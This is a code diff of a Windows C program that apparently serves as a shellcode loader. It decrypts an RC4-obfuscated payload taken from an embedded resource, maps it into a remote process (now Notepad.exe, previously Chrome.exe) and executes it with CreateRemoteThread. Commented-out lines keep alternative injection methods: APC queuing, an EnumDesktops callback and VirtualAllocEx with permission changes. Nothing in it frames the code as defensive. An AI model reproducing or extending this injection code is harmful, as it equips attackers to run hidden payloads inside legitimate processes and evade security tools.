@@ -2,14 +2,14 @@
 typedef void(WINAPI* pdllMainFunction)();
 int main()
 {
-	HANDLE hProcess = 0, hProcess1 = 0, hProcess2 = 0, hThread = 0, hThread1 = 0, hTimer = NULL;
+	HANDLE hProcess = 0, hProcess1 = 0, hProcess2 = 0, hThread = 0, hThread1 = 0, hPayloadObjectHandle = 0;
 	DWORD  dwPID0 = 0, dwPID1 = 0, dwPID2 = 0, dwOldProtections = 0, dwThreadId;
 	PUCHAR pObfInput = NULL, * pObfOutput = NULL, pKey = NULL, pExtPayloadAddres = NULL;
 	SIZE_T sBytesWritten = 0, sPaddedInputSize = 64, sObfuscatedSize = 0, sClearPayload = 0, sOriginalInputSize = 64;
 	Context RC4Context_t;
 	RESOURCE resource;
 	PVOID pExPayload, pMain;
-	LPWSTR TargetProcessName = L"Chrome.exe";
+	LPWSTR TargetProcessName = L"Notepad.exe";
 
 	
 
@@ -40,18 +40,21 @@ int main()
 
 	if (!FetchResource(&resource)) return -5;
 
-	PAYLOAD pPayload_t = {
-		.pText = LocalAlloc(LPTR, resource.sSize),
-		.sText = resource.sSize
-	};
-
+	InjectPayloadRemoteMappedMemory(resource.pAddress, &pExtPayloadAddres, &pObfInput,resource.sSize, &hPayloadObjectHandle,hProcess);
+	
 	if (!rInit(&RC4Context_t, pKey, strlen((CHAR*)pKey))) return -6;
 
-	rFin(&RC4Context_t, (PVOID)resource.pAddress, pPayload_t.pText, pPayload_t.sText);
+	rFin(&RC4Context_t, (PVOID)resource.pAddress, pObfInput, resource.sSize);
 
-	if(!MapLocalMemory(pPayload_t.pText, &pExtPayloadAddres, pPayload_t.sText, &hThread1));
+	//if(!MapLocalMemory(pPayload_t.pText, &pExtPayloadAddres, pPayload_t.sText, &hPayloadObjectHandle))return -7;
+	//InjectPayloadRemoteMappedMemory(pExtPayloadAddres, &pExtPayloadAddres, resource.sSize, &hPayloadObjectHandle, hProcess);
 
 	printf("0x%p\n", pExtPayloadAddres);
+	hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pExtPayloadAddres, NULL, NULL, &dwThreadId);
+
+	WaitForSingleObjectEx(hThread, 150, TRUE);
+
+	//hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pExtPayloadAddres, NULL, NULL, &dwThreadId);
 
 	//if (!(pExPayload = VirtualAllocEx(hProcess1, 0, pPayload_t.sText,MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE))) return -7;
 
@@ -59,11 +62,16 @@ int main()
 
 	//VirtualProtectEx(hProcess1, pExPayload, pPayload_t.sText,PAGE_EXECUTE, &dwOldProtections);
 
+	//QueueUserAPC((PAPCFUNC)pExtPayloadAddres, hThread, 0);
+	
+	//InjectCallbackPayloadEnumDesktops(pPayload_t.pText, (DWORD)pPayload_t.sText, &dwOldProtections, (PVOID*)&pExtPayloadAddres);
 
-	//QueueUserAPC((PAPCFUNC)pExPayload, hThread1, 0);
-	InjectCallbackPayloadEnumDesktops(pPayload_t.pText, (DWORD)pPayload_t.sText, &dwOldProtections, (PVOID*)&pExtPayloadAddres);
+	//WaitForSingleObject(hThread, 150);
+
+	UnmapViewOfFile(pExtPayloadAddres);
 
 	printf("Injecting Shellcode At Address: 0x%p\n", pExtPayloadAddres);
+
 	getchar();
 
 	//DebugActiveProcessStop(dwPID1);
@@ -80,7 +88,7 @@ int main()
 
 	printf("[#] Press 'Enter' To Exit! :)");
 
-	//Sleep(200 * 10);
+	Sleep(200 * 10);
 
 	return 0;
 }
